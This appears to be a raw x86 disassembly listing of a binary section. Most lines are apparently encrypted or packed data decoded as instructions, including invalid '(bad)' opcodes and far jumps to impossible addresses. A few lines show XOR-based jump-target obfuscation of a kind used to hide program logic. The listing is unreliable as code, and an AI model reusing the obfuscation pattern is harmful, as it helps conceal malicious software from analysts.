  40d352:	or     eax,0x11a7f700
  40d357:	cmp    BYTE PTR [esi-0xda9dc32],bl
  40d35d:	add    DWORD PTR [esi+0x1fb727e5],esp
  40d363:	mov    al,ds:0x969bf4d4
  40d368:	add    DWORD PTR [edx-0x4527be81],edi
  40d36e:	mov    BYTE PTR [edi+0x5c],bh
  40d371:	clc    
  40d372:	push   ss
  40d373:	jno    0x40d341
  40d375:	lods   al,BYTE PTR ds:[esi]
  40d376:	mov    bl,BYTE PTR [ecx]
  40d378:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d379:	shl    esp,0x9
  40d37c:	sub    ebp,edi
  40d37e:	cld    
  40d37f:	inc    ebp
  40d380:	push   dx
  40d382:	icebp  
  40d383:	lods   al,BYTE PTR ds:[esi]
  40d384:	mov    edx,0x90b94474
  40d389:	lods   eax,DWORD PTR ds:[esi]
  40d38a:	dec    edx
  40d38b:	pop    ecx
  40d38c:	inc    eax
  40d38d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d38e:	mov    ds:0x66a38c4b,eax
  40d393:	xchg   esi,eax
  40d394:	(bad)  
  40d395:	mov    BYTE PTR [eax-0x3e],bh
  40d398:	jecxz  0x40d411
  40d39a:	pop    ss
  40d39b:	les    edi,FWORD PTR [edx+ebx*4-0x3e]
  40d39f:	inc    eax
  40d3a0:	pop    edx
  40d3a1:	push   ds
  40d3a2:	sar    DWORD PTR [ecx-0x5f213be0],0x3a
  40d3a9:	mov    bh,0x5a
  40d3ab:	cdq    
  40d3ac:	dec    edx
  40d3ad:	loope  0x40d3c3
  40d3af:	mov    dl,0x58
  40d3b1:	jnp    0x40d398
  40d3b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d3b4:	xchg   ebx,eax
  40d3b5:	lods   eax,DWORD PTR ds:[esi]
  40d3b6:	nop
  40d3b7:	push   edi
  40d3b8:	adc    ebx,edx
  40d3ba:	add    ah,BYTE PTR [esi-0x1e35d04a]
  40d3c0:	data16 or al,0xad
  40d3c3:	mov    bl,0x8
  40d3c5:	aas    
  40d3c6:	test   ebx,edx
  40d3c8:	gs out 0xdd,eax
  40d3cb:	xor    DWORD PTR [edi+0x7a],esi
  40d3ce:	mov    ch,0xd6
  40d3d0:	outs   dx,DWORD PTR ds:[esi]
  40d3d1:	xor    DWORD PTR [ecx+0x1a],ebp
  40d3d4:	adc    al,0x77
  40d3d6:	addr16 hlt 
  40d3d8:	add    BYTE PTR [ecx-0x5e4f5060],0xae
  40d3df:	cwde   
  40d3e0:	fadd   DWORD PTR [edx+ebx*2-0x80]
  40d3e4:	leave  
  40d3e5:	dec    ebx
  40d3e6:	lds    ebp,FWORD PTR [ebp+0x6160725e]
  40d3ec:	sar    DWORD PTR [edx+0x67dd2517],1
  40d3f2:	(bad)  
  40d3f3:	xor    cl,BYTE PTR [esp+ebp*4+0x4c]
  40d3f7:	mov    ch,0xea
  40d3f9:	inc    esi
  40d3fa:	and    al,0xa
  40d3fc:	sar    ebx,0x3a
  40d3ff:	add    eax,DWORD PTR [esi-0x49237f15]
  40d405:	and    DWORD PTR [ebp+0x47],0x781a1500
  40d40c:	jnp    0x40d472
  40d40e:	dec    esp
  40d40f:	jmp    0x9d0547f4
  40d414:	sub    BYTE PTR [ebx],0xfe
  40d417:	jo     0x40d3de
  40d419:	test   DWORD PTR [eax-0x3a99c554],0xf5acdc2a
  40d423:	pop    edi
  40d424:	(bad)  [esp+eiz*2-0x63]
  40d428:	sbb    ch,cl
  40d42a:	mov    esi,0xd9930322
  40d42f:	sub    DWORD PTR [ebp-0x35],edi
  40d432:	or     edx,DWORD PTR [ebp+0x35]
  40d435:	adc    eax,0xda0252a4
  40d43a:	in     eax,0x1c
  40d43c:	cmp    BYTE PTR [edx],ch
  40d43e:	je     0x40d450
  40d440:	ja     0x40d400
  40d442:	jbe    0x40d437
  40d444:	cli    
  40d445:	push   edi
  40d446:	xchg   esp,eax
  40d447:	sub    bl,bh
  40d449:	inc    esp
  40d44a:	int3   
  40d44b:	int    0x21
  40d44d:	ja     0x40d3f9
  40d44f:	out    dx,eax
  40d450:	gs mov dl,0x1a
  40d453:	ins    BYTE PTR es:[edi],dx
  40d454:	cmp    DWORD PTR [ebp-0x31],0x98aa2f4e
  40d45b:	and    DWORD PTR [ebp-0x78214908],eax
  40d461:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d462:	(bad)  
  40d464:	mov    dl,BYTE PTR [ebp+0x2a]
  40d467:	sar    DWORD PTR [esp+eax*1+0x26],0xe1
  40d46c:	xor    ah,BYTE PTR [ebp+esi*1+0x60]
  40d470:	jne    0x40d4df
  40d472:	aaa    
  40d473:	xchg   edx,eax
  40d474:	stc    
  40d475:	inc    esi
  40d476:	inc    eax
  40d477:	and    al,0x76
  40d479:	ret    0xfe5f
  40d47c:	scas   al,BYTE PTR es:[edi]
  40d47d:	aad    0x7
  40d47f:	rcl    DWORD PTR [edx+0x55],cl
  40d482:	ins    DWORD PTR es:[edi],dx
  40d483:	div    BYTE PTR [esi]
  40d485:	xchg   edx,eax
  40d486:	xor    bh,BYTE PTR [edx-0x5b]
  40d489:	mov    ds:0x9310b47b,eax
  40d48e:	outs   dx,DWORD PTR ds:[esi]
  40d48f:	inc    eax
  40d490:	mov    WORD PTR [ebp+esi*1+0x1652bcbf],ds
  40d497:	out    dx,al
  40d498:	ret    0xfb9
  40d49b:	fnstsw WORD PTR [edx+0x5ab0620b]
  40d4a1:	sbb    eax,0x9ccaf42e
  40d4a6:	int    0x2f
  40d4a8:	dec    ebp
  40d4a9:	sub    dh,BYTE PTR ds:0x63a09fb1
  40d4af:	xchg   esp,eax
  40d4b0:	arpl   WORD PTR [eax-0x5ab3a4b6],dx
  40d4b6:	ja     0x40d497
  40d4b8:	fwait
  40d4b9:	enter  0x2bde,0x17
  40d4bd:	xchg   edi,eax
  40d4be:	and    al,0x77
  40d4c0:	test   BYTE PTR [ecx-0xd],dh
  40d4c3:	or     edi,esp
  40d4c5:	dec    ebx
  40d4c6:	loope  0x40d488
  40d4c8:	outs   dx,BYTE PTR ds:[esi]
  40d4c9:	adc    DWORD PTR [edi+0x0],ebx
  40d4cc:	mov    ds:0x53962408,eax
  40d4d1:	jmp    0x98bb3084
  40d4d6:	(bad)  
  40d4d7:	jmp    0xfdc7:0x289c7a4a
  40d4de:	sub    BYTE PTR [ecx+eax*2+0x7c],al
  40d4e2:	pushf  
  40d4e3:	add    BYTE PTR [eax],0x33
  40d4e6:	ins    DWORD PTR es:[edi],dx
  40d4e7:	loop   0x40d4e1
  40d4e9:	adc    eax,0xb34890fb
  40d4ee:	xchg   ebp,eax
  40d4ef:	sti    
  40d4f0:	push   esi
  40d4f1:	pop    eax
  40d4f2:	mov    eax,ds:0x938c90d0
  40d4f7:	cmc    
  40d4f8:	inc    edi
  40d4f9:	or     DWORD PTR [ebp+edx*1-0x6e2f2ac7],eax
  40d500:	popf   
  40d501:	fs adc al,0xb6
  40d504:	int    0x31
  40d506:	pushf  
  40d507:	sub    BYTE PTR ds:0xb7e9558e,0xa0
  40d50e:	dec    eax
  40d50f:	sbb    ebx,DWORD PTR [ecx]
  40d511:	fs sbb al,0xfe
  40d514:	inc    ebp
  40d515:	push   ebp
  40d516:	cld    
  40d517:	xchg   esp,eax
  40d518:	cdq    
  40d519:	xchg   ebx,eax
  40d51a:	adc    ebx,DWORD PTR [eax]
  40d51c:	(bad)  
  40d51d:	in     al,dx
  40d51e:	(bad)  
  40d51f:	loop   0x40d4b5
  40d521:	cmc    
  40d522:	adc    BYTE PTR [ecx],ah
  40d524:	das    
  40d525:	pop    esp
  40d526:	das    
  40d527:	ss enter 0x6d83,0xd9
  40d52c:	pop    es
  40d52d:	ins    DWORD PTR es:[edi],dx
  40d52e:	das    
  40d52f:	inc    edx
  40d530:	mov    BYTE PTR [ecx],ah
  40d532:	pop    edx
  40d533:	and    bl,BYTE PTR [eax+0x14]
  40d536:	adc    BYTE PTR [edi+0x63],bh
  40d539:	scas   al,BYTE PTR es:[edi]
  40d53a:	mov    al,ds:0xa49476e5
  40d53f:	test   DWORD PTR [esi-0x35],ebx
  40d542:	retf   
  40d543:	loopne 0x40d521
  40d545:	push   ebp
  40d546:	out    dx,al
  40d547:	pop    edi
  40d548:	jmp    0x40d5a9
  40d54a:	sti    
  40d54b:	stos   DWORD PTR es:[edi],eax
  40d54c:	in     eax,0xc8
  40d54e:	push   esp
  40d54f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d550:	loopne 0x40d5ab
  40d552:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d553:	(bad)  
  40d554:	cmp    eax,0x23bc62e9
  40d559:	rol    ch,cl
  40d55b:	xchg   ecx,eax
  40d55c:	aas    
  40d55d:	popf   
  40d55e:	dec    eax
  40d55f:	fadd   QWORD PTR [ecx]
  40d561:	pop    edi
  40d562:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d564:	cli    
  40d565:	dec    ebp
  40d566:	shl    DWORD PTR [edx-0x42],cl
  40d569:	pushf  
  40d56a:	arpl   WORD PTR [edx+0x3d],di
  40d56d:	inc    ebp
  40d56e:	xor    ecx,eax
  40d570:	inc    edx
  40d571:	les    ebp,FWORD PTR [eax]
  40d573:	(bad)  
  40d574:	mov    edx,0xfb623114
  40d579:	fisttp QWORD PTR [ebx]
  40d57b:	cli    
  40d57c:	mov    ch,0x1a
  40d57e:	popa   
  40d57f:	adc    eax,0x6ec8d4f2
  40d584:	xchg   ebp,ebx
  40d586:	not    eax
  40d588:	push   eax
  40d589:	scas   al,BYTE PTR es:[edi]
  40d58a:	mov    BYTE PTR [ebx+0x1ec76ae6],ch
  40d590:	outs   dx,DWORD PTR ds:[esi]
  40d591:	ret    
  40d592:	xchg   edx,eax
  40d593:	aas    
  40d594:	test   al,0x0
  40d596:	leave  
  40d597:	xchg   esp,eax
  40d598:	inc    ebx
  40d599:	push   0xffffffc7
  40d59b:	mov    BYTE PTR [edi],ch
  40d59d:	or     ecx,esi
  40d59f:	inc    esp
  40d5a0:	jbe    0x40d5fc
  40d5a2:	mov    ds:0xf7093d37,al
  40d5a7:	(bad)  
  40d5a8:	aam    0x33
  40d5aa:	and    eax,DWORD PTR [ecx-0x38]
  40d5ad:	xchg   ebx,eax
  40d5ae:	inc    esi
  40d5af:	shr    DWORD PTR [ecx+0x7b],1
  40d5b2:	cmp    BYTE PTR [edx+0x1bfaed83],0xe1
  40d5b9:	scas   al,BYTE PTR es:[edi]
  40d5ba:	cmp    al,0xb2
  40d5bc:	pop    es
  40d5bd:	lea    esi,[edi+0x6def2d93]
  40d5c3:	gs sar ebp,1
  40d5c6:	adc    DWORD PTR [esi+0x5b],esp
  40d5c9:	mov    ecx,0x5b0b5fca
  40d5ce:	adc    esp,ecx
  40d5d0:	mov    al,ds:0xe783eae7
  40d5d5:	aad    0x6a
  40d5d7:	xor    BYTE PTR [ecx-0x51fb8afe],al
  40d5dd:	cli    
  40d5de:	in     al,dx
  40d5df:	imul   eax,DWORD PTR [edx]
  40d5e2:	mov    edx,DWORD PTR [ebp-0x4]
  40d5e5:	xor    edx,ecx
  40d5e7:	mov    ecx,DWORD PTR [ebp+0x8]
  40d5ea:	lea    ecx,[edx+ecx*1+0x32729b]
  40d5f1:	cmp    ecx,eax
  40d5f3:	je     0x40dfca
  40d5f9:	mov    edi,DWORD PTR [ebp-0x18]
  40d5fc:	mov    eax,DWORD PTR [ebp+0x8]
  40d5ff:	mov    edx,DWORD PTR [ebp+0x14]
  40d602:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40d606:	mov    ecx,0x7510854
  40d60b:	xor    edx,edx
  40d60d:	xor    edi,ecx
  40d60f:	mov    esi,0x32729b
  40d614:	add    edi,esi
  40d616:	div    edi
  40d618:	mov    edx,DWORD PTR [ebp-0x4]
  40d61b:	jmp    0x40d93b
  40d620:	inc    ecx
  40d621:	stos   BYTE PTR es:[edi],al
  40d622:	push   ss
  40d623:	jmp    0x40d61a
  40d625:	jae    0x40d688
  40d627:	mov    al,0xbf
  40d629:	jo     0x40d5c5
  40d62b:	jecxz  0x40d66f
  40d62d:	cs jl  0x40d5be
  40d630:	sub    edx,DWORD PTR [eax+0x7d7d7e7e]
  40d636:	jle    0x40d6b6
  40d638:	adc    ebx,DWORD PTR es:[bx]
  40d63c:	push   eax
  40d63d:	pop    edi
  40d63e:	mov    ebx,0xeeec8031
  40d643:	mov    edi,0x18b7d641
  40d648:	add    al,0x67
  40d64a:	in     eax,dx
  40d64b:	outs   dx,BYTE PTR ds:[esi]
  40d64c:	sti    
  40d64d:	cs jge 0x40d66a
  40d650:	xlat   BYTE PTR ds:[ebx]
  40d651:	jbe    0x40d5ef
  40d653:	fsubr  st,st(4)
  40d655:	xor    eax,0xd359c834
  40d65a:	arpl   WORD PTR ds:0xb2c6c6e3,sp
  40d660:	xor    DWORD PTR [esi-0x16],0xffffff96
  40d664:	and    eax,0x2957d8b1
  40d669:	ficomp WORD PTR [edi+0x19]
  40d66c:	daa    
  40d66d:	or     ebp,ebx
  40d66f:	pop    ss
  40d670:	mov    DWORD PTR [ecx],edi
  40d672:	fisub  DWORD PTR [edi]
  40d674:	sub    al,0x90
  40d676:	js     0x40d6d3
  40d678:	pop    esp
  40d679:	and    eax,0x2c2051e4
  40d67e:	sub    esp,DWORD PTR [edi]
  40d680:	shl    BYTE PTR ds:0x95a37bbb,cl
  40d686:	mov    ds:0xdd8c6e85,eax
  40d68b:	add    bl,BYTE PTR [ecx]
  40d68d:	mov    ds:0xe18274d9,eax
  40d692:	push   cs
  40d693:	ja     0x40d6ae
  40d695:	and    edx,DWORD PTR es:[ecx]
  40d698:	into   
  40d699:	enter  0x3605,0xdd
  40d69d:	mov    esi,0x55bf450e
  40d6a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d6a3:	sub    eax,0x309a09c5
  40d6a8:	mov    al,ds:0xfe63f1cd
  40d6ad:	pushf  
  40d6ae:	xchg   ebp,eax
  40d6af:	mov    al,ds:0xb26f3f52
  40d6b4:	test   BYTE PTR [ecx+0x4a],dh
  40d6b7:	mov    eax,0x45e84e19
  40d6bc:	mov    al,ds:0xa8ad8df3
  40d6c1:	or     ecx,esi
  40d6c3:	dec    ebp
  40d6c4:	xchg   DWORD PTR [eax-0x68],edx
  40d6c7:	push   cs
  40d6c8:	xchg   DWORD PTR [eax],edx
  40d6ca:	sub    eax,0xf6f7435
  40d6cf:	jns    0x40d680
  40d6d1:	inc    esp
  40d6d2:	add    dl,dl
  40d6d4:	pop    eax
  40d6d5:	inc    edi
  40d6d6:	xchg   ebx,eax
  40d6d7:	stc    
  40d6d8:	ret    0xd23c
  40d6db:	xor    DWORD PTR [eax+0x59455394],0x1e
  40d6e2:	add    bl,dh
  40d6e4:	je     0x40d6c8
  40d6e6:	aam    0x17
  40d6e8:	xor    BYTE PTR [esi+ebp*1-0x24b6af94],ah
  40d6ef:	sbb    DWORD PTR [ebp-0x40],ebp
  40d6f2:	fnstenv [eax+0x796be2d2]
  40d6f8:	out    dx,eax
  40d6f9:	aas    
  40d6fa:	mov    esi,DWORD PTR [eax+ebp*4]
  40d6fd:	loop   0x40d6f2
  40d6ff:	sub    BYTE PTR [edx],cl
  40d701:	inc    edi
  40d702:	xchg   ebp,eax
  40d703:	mov    cl,cl
  40d705:	add    DWORD PTR [eax],0xcc339af
  40d70b:	icebp  
  40d70c:	push   0x4d
  40d70e:	pushf  
  40d70f:	dec    edx
  40d710:	je     0x40d780
  40d712:	jmp    0xb6ecdb01
  40d717:	xor    eax,0x9216e9d1
  40d71c:	and    al,0xfd
  40d71e:	adc    eax,0xb1a8b227
  40d723:	adc    DWORD PTR [esp+esi*4],0xffffffcb
  40d727:	adc    al,0xbb
  40d729:	xlat   BYTE PTR ds:[ebx]
  40d72a:	xchg   ecx,eax
  40d72b:	jge    0x40d773
  40d72d:	mov    cl,0x55
  40d72f:	pushf  
  40d730:	inc    DWORD PTR [esi+eax*4-0x1a3e5257]
  40d737:	inc    edi
  40d738:	jmp    0x8a1bb975
  40d73d:	add    DWORD PTR [ebx],eax
  40d73f:	push   esi
  40d740:	ja     0x40d6fb
  40d742:	add    edi,ebp
  40d744:	adc    BYTE PTR [ecx],bl
  40d746:	(bad)  
  40d747:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d748:	xor    al,0x37
  40d74a:	push   es
  40d74b:	shl    BYTE PTR [ecx+0x3e79050f],0x6c
  40d752:	dec    ebx
  40d753:	pop    ecx
  40d754:	add    ch,dl
  40d756:	loop   0x40d789
  40d758:	jns    0x40d701
  40d75a:	mov    eax,ds:0xd1a10fec
  40d75f:	jg     0x40d705
  40d761:	(bad)  
  40d763:	hlt    
  40d764:	shr    al,1
  40d766:	lds    bp,DWORD PTR [eax-0x1c]
  40d76a:	popa   
  40d76b:	sbb    DWORD PTR [esi+0x2a],esi
  40d76e:	(bad)  
  40d770:	and    BYTE PTR [ecx+0xc],ch
  40d773:	bound  eax,QWORD PTR [ebx-0x53]
  40d776:	xchg   ecx,eax
  40d777:	xor    eax,0x261d1ca8
  40d77c:	arpl   WORD PTR [ecx+0x2f],di
  40d77f:	lea    ebp,[edx+0x66]
  40d782:	test   BYTE PTR [ebx+0x15b70d5d],dh
  40d788:	pusha  
  40d789:	icebp  
  40d78a:	and    bh,dl
  40d78c:	scas   eax,DWORD PTR es:[edi]
  40d78d:	xor    BYTE PTR [ebx+eax*2],ch
  40d790:	fmul   QWORD PTR [ebp-0x37861e70]
  40d796:	clc    
  40d797:	mov    esp,0x9a9a153d
  40d79c:	and    al,0x17
  40d79e:	inc    BYTE PTR [ecx+ecx*2+0x567808a8]
  40d7a5:	lods   eax,DWORD PTR ds:[esi]
  40d7a6:	jp     0x40d7ab
  40d7a8:	iret   
  40d7a9:	add    al,0x7b
  40d7ab:	out    0x8d,al
  40d7ad:	aam    0x0
  40d7af:	dec    esi
  40d7b0:	xor    BYTE PTR [ebx],0xdd
  40d7b3:	mov    DWORD PTR [esi-0x7],edx
  40d7b6:	pop    ebp
  40d7b7:	(bad)  
  40d7b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d7b9:	lock lock daa 
  40d7bc:	adc    eax,0xce73b0a9
  40d7c1:	ins    BYTE PTR es:[edi],dx
  40d7c2:	xchg   ebp,eax
  40d7c3:	ret    
  40d7c4:	inc    edi
  40d7c5:	pop    ss
  40d7c6:	aas    
  40d7c7:	xor    BYTE PTR [ecx+0x40],ah
  40d7ca:	mov    esi,0x5f29e767
  40d7cf:	idiv   bh
  40d7d1:	xor    ch,dl
  40d7d3:	(bad)  
  40d7d4:	nop
  40d7d5:	adc    al,0x6c
  40d7d7:	pop    ebp
  40d7d8:	xchg   esi,eax
  40d7d9:	cs push eax
  40d7db:	xor    ecx,ebx
  40d7dd:	or     al,0x40
  40d7df:	mov    dh,BYTE PTR [esi-0x7f66c67]
  40d7e5:	xor    eax,0xe6e2a870
  40d7ea:	fcmovu st,st(0)
  40d7ec:	inc    edi
  40d7ed:	jns    0x40d7e5
  40d7ef:	into   
  40d7f0:	lods   al,BYTE PTR ds:[esi]
  40d7f1:	(bad)  
  40d7f2:	data16 fdiv DWORD PTR [edi-0x7d]
  40d7f6:	repnz stos DWORD PTR es:[edi],eax
  40d7f8:	mov    DWORD PTR cs:[edi],edi
  40d7fb:	jbe    0x40d803
  40d7fd:	call   0x693d:0x2e2b4b34
  40d804:	int3   
  40d805:	(bad)  
  40d806:	pushf  
  40d807:	rol    BYTE PTR [esi+ebx*4-0x5e],0xc7
  40d80c:	xchg   ecx,eax
  40d80d:	(bad)  
  40d80e:	popa   
  40d80f:	pusha  
  40d810:	mov    edx,0x76b93020
  40d815:	pop    ecx
  40d816:	xor    BYTE PTR [ecx],0x3a
  40d819:	xor    dh,0x9f
  40d81c:	push   ss
  40d81d:	addr16 dec ecx
  40d81f:	push   edx
  40d820:	add    al,0x1a
  40d822:	ret    0x6a6c
  40d825:	stos   BYTE PTR es:[edi],al
  40d826:	cmp    esi,ebp
  40d828:	out    dx,al
  40d829:	jbe    0x40d7ea
  40d82b:	sub    al,0x9b
  40d82d:	addr16 dec edi
  40d82f:	test   al,0xc2
  40d831:	lahf   
  40d832:	adc    al,0xc1
  40d834:	mov    dl,0x5b
  40d836:	pop    esi
  40d837:	shr    BYTE PTR [ecx+0x3d],1
  40d83a:	imul   ebp,DWORD PTR [ecx+eiz*8],0xfffffff3
  40d83e:	arpl   bp,ax
  40d840:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d841:	xchg   BYTE PTR [eax+ecx*4],ch
  40d844:	repnz and bh,BYTE PTR [edi-0x31]
  40d848:	bnd ja 0x40d8b8
  40d84b:	xor    eax,0x27f3f03
  40d850:	mov    edx,0x10970f21
  40d855:	add    DWORD PTR [ebx+ebp*4],esi
  40d858:	or     bh,dh
  40d85a:	jno    0x40d868
  40d85c:	in     eax,dx
  40d85d:	fstp   QWORD PTR [ecx+0x6f]
  40d860:	je     0x40d899
  40d862:	add    BYTE PTR [ebx+0x1],dl
  40d865:	and    bh,BYTE PTR [esi-0x65]
  40d868:	out    dx,al
  40d869:	adc    ecx,DWORD PTR [ecx]
  40d86b:	pop    ss
  40d86c:	test   al,0xc0
  40d86e:	imul   edx,ecx,0x7d
  40d871:	add    eax,DWORD PTR [edi-0x38031eee]
  40d877:	add    al,0x3b
  40d879:	sbb    ah,bl
  40d87b:	(bad)  
  40d87c:	hlt    
  40d87d:	pop    ebx
  40d87e:	pusha  
  40d87f:	xchg   esp,eax
  40d880:	or     eax,0x6522f55d
  40d885:	add    al,0xf
  40d887:	add    BYTE PTR [edx+0x41],dl
  40d88a:	jo     0x40d8e7
  40d88c:	and    al,ch
  40d88e:	dec    ebp
  40d88f:	dec    esp
  40d890:	jbe    0x40d8a6
  40d892:	inc    esp
  40d893:	push   0xa85ef91f
  40d898:	pop    ebx
  40d899:	rol    BYTE PTR [ebp+eiz*1+0xf],0xdd
  40d89e:	enterw 0xa730,0x23
  40d8a3:	pop    ecx
  40d8a4:	add    eax,0xb7caa0f4
  40d8a9:	mov    al,ds:0xa31ace5f
  40d8ae:	out    dx,al
  40d8af:	jmp    0x8613:0xacec5e38
  40d8b6:	outs   dx,BYTE PTR ds:[esi]
  40d8b7:	push   eax
  40d8b8:	push   ebx
  40d8b9:	sub    al,0x86
  40d8bb:	test   al,0xc6
  40d8bd:	jecxz  0x40d855
  40d8bf:	call   0x2a328dd2
  40d8c4:	add    esi,DWORD PTR [ebx-0x3c]
  40d8c7:	jp     0x40d87f
  40d8c9:	pop    edx
  40d8ca:	add    DWORD PTR [esi-0x1939976e],esp
  40d8d0:	mov    al,ds:0x3854aff8
  40d8d5:	ins    BYTE PTR es:[edi],dx
  40d8d6:	jmp    0x3bef5ab
  40d8db:	out    0x37,al
  40d8dd:	adc    BYTE PTR [ebp-0x63e9d337],ch
  40d8e3:	or     dh,BYTE PTR [esp+ebx*8]
  40d8e6:	imul   edx,ebx,0x39
  40d8e9:	int    0x95
  40d8eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d8ec:	repz xchg ebx,eax
  40d8ee:	inc    DWORD PTR [edx+0x7d]
  40d8f1:	rcl    DWORD PTR [edx],0x32
  40d8f4:	xchg   edx,eax
  40d8f5:	jns    0x40d878
  40d8f7:	test   eax,0xa7417f5b
  40d8fc:	xchg   BYTE PTR [ebp+0x39],bl
  40d8ff:	push   edx
  40d900:	xchg   BYTE PTR [ebp-0x41],al
  40d903:	ins    DWORD PTR es:[edi],dx
  40d904:	in     eax,dx
  40d905:	adc    eax,0xb0e7fed7
  40d90a:	mov    esp,0x584dd0c8
  40d90f:	sub    ah,cl
  40d911:	stos   BYTE PTR es:[edi],al
  40d912:	call   0x1b62:0x84891d9b
  40d919:	adc    dl,al
  40d91b:	in     eax,dx
  40d91c:	shl    dh,0xf5
  40d91f:	data16 icebp 
  40d921:	jns    0x40d8d8
  40d923:	pop    esp
  40d924:	sbb    al,0x2e
  40d926:	jg     0x40d992
  40d928:	pop    eax
  40d929:	jne    0x40d936
  40d92b:	push   0x23
  40d92d:	jae    0x40d9ae
  40d92f:	frstor [eax-0x153c76c6]
  40d935:	push   0x32
  40d937:	outs   dx,DWORD PTR ds:[esi]
  40d938:	cld    
  40d939:	pop    es
  40d93a:	iret   
  40d93b:	xor    edx,ecx
  40d93d:	lea    eax,[edx+eax*1+0x32729b]
  40d944:	jmp    0x40dc64
  40d949:	das    
  40d94a:	sub    BYTE PTR [ecx],0x25
  40d94d:	mov    cl,0xb5
  40d94f:	xor    edx,DWORD PTR [eax-0x2c802913]
  40d955:	std    
  40d956:	enter  0xe60b,0x36
  40d95a:	lahf   
  40d95b:	jle    0x40d9db
  40d95d:	jge    0x40d9dc
  40d95f:	jle    0x40d9df
  40d961:	xor    BYTE PTR [eax-0x10a0a146],al
  40d967:	ficomp WORD PTR [ecx]
  40d969:	and    eax,0x75d03d72
  40d96e:	adc    cl,BYTE PTR [edx-0x6c60a9ac]
  40d974:	xchg   ebx,eax
  40d975:	popa   
  40d976:	push   0x6eaba067
  40d97b:	dec    edi
  40d97c:	and    eax,0x4c0446b4
  40d981:	pop    es
  40d982:	dec    ebx
  40d983:	mov    BYTE PTR [esi+0x46],al
  40d986:	lods   eax,DWORD PTR ds:[esi]
  40d987:	lahf   
  40d988:	dec    ecx
  40d989:	popf   
  40d98a:	dec    edx
  40d98b:	popa   
  40d98c:	inc    edi
  40d98d:	stc    
  40d98e:	adc    ebp,edi
  40d990:	xchg   ebp,eax
  40d991:	outs   dx,BYTE PTR ds:[esi]
  40d992:	xlat   BYTE PTR ds:[ebx]
  40d993:	or     al,0x2c
  40d995:	or     DWORD PTR [ecx+0x51],0x24
  40d999:	or     al,0x7a
  40d99b:	cmp    edx,edi
  40d99d:	xchg   ebx,eax
  40d99e:	sahf   
  40d99f:	add    al,0x3f
  40d9a1:	pop    esi
  40d9a2:	jg     0x40da1e
  40d9a4:	(bad)  
  40d9a5:	adc    al,0x63
  40d9a7:	mov    edi,0xf0812e65
  40d9ac:	scas   eax,DWORD PTR es:[edi]
  40d9ad:	out    dx,al
  40d9ae:	ret    0x1cb1
  40d9b1:	icebp  
  40d9b2:	push   ds
  40d9b3:	dec    ebp
  40d9b4:	aas    
  40d9b5:	mov    edi,0x2363afe
  40d9ba:	scas   eax,DWORD PTR es:[edi]
  40d9bb:	push   eax
  40d9bc:	bound  ecx,QWORD PTR [edi-0x71fdedc6]
  40d9c2:	push   edi
  40d9c3:	mov    dl,0x16
  40d9c5:	inc    ebx
  40d9c6:	sub    ebp,0xffffff94
  40d9c9:	scas   al,BYTE PTR es:[edi]
  40d9ca:	jmp    0xe31a:0xf1c735aa
  40d9d1:	imul   ebx,DWORD PTR [edx-0x4d],0xffffffbe
  40d9d5:	and    cl,dh
  40d9d7:	add    edx,0xffffffa5
  40d9da:	sbb    dh,BYTE PTR [edi+0xb]
  40d9dd:	adc    edx,DWORD PTR [ebx]
  40d9df:	mov    esp,DWORD PTR [edi+0x2c]
  40d9e2:	mov    eax,ds:0x8e1c8223
  40d9e7:	inc    eax
  40d9e8:	mov    WORD PTR [edx],cs
  40d9ea:	xchg   edx,eax
  40d9eb:	into   
  40d9ec:	add    BYTE PTR [ebx-0x3a4be],0x92
  40d9f3:	pushf  
  40d9f4:	ja     0x40da4e
  40d9f6:	iret   
  40d9f7:	mov    ah,0x80
  40d9f9:	or     BYTE PTR [eax-0x1],ah
  40d9fc:	fdiv   st(0),st
  40d9fe:	inc    ebx
  40d9ff:	inc    ebp
  40da00:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  40da02:	mov    BYTE PTR [ecx+0x3],al
  40da05:	dec    esp
  40da06:	test   eax,0x7e527dc7
  40da0b:	sub    BYTE PTR [edi+edi*1],bl
  40da0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da0f:	and    dh,BYTE PTR [edx+eiz*2]
  40da12:	jne    0x40da4e
  40da14:	fbld   TBYTE PTR [ecx-0x679abd42]
  40da1a:	cmp    eax,0x9c9476d4
  40da1f:	jo     0x40d9aa
  40da21:	dec    edi
  40da22:	(bad)  
  40da23:	jns    0x40d9bb
  40da25:	or     ecx,edx
  40da27:	nop
  40da28:	jp     0x40da63
  40da2a:	xchg   edx,eax
  40da2b:	push   edi
  40da2c:	repz shl BYTE PTR [esi-0x7f44afce],1
  40da33:	out    dx,eax
  40da34:	rol    BYTE PTR [edx],cl
  40da36:	sti    
  40da37:	daa    
  40da38:	or     ecx,ecx
  40da3a:	dec    ebx
  40da3b:	jmp    0x6384:0x43e1dad4
  40da42:	sbb    edi,esp
  40da44:	js     0x40dab9
  40da46:	(bad)  
  40da47:	out    dx,al
  40da48:	dec    esi
  40da49:	mov    eax,ds:0x2af06898
  40da4e:	pop    ebp
  40da4f:	mov    eax,0xc4e207bc
  40da54:	inc    ebp
  40da55:	cmc    
  40da56:	rcl    DWORD PTR ds:0x10c3c833,1
  40da5c:	retf   0x200c
  40da5f:	push   cs
  40da60:	test   al,0x75
  40da62:	sub    eax,0x2c4f7889
  40da67:	imul   BYTE PTR [eax-0x46]
  40da6a:	dec    eax
  40da6b:	mov    DWORD PTR [esi+edx*4+0x7d],edi
  40da6f:	out    dx,al
  40da70:	cmp    edi,DWORD PTR [edi-0x58]
  40da73:	fld    DWORD PTR [ebx+ebx*1-0x5c]
  40da77:	jp     0x40da6e
  40da79:	xor    al,0xac
  40da7b:	fsub   DWORD PTR [edi+0x5ba7cef6]
  40da81:	xchg   edx,eax
  40da82:	in     al,0x65
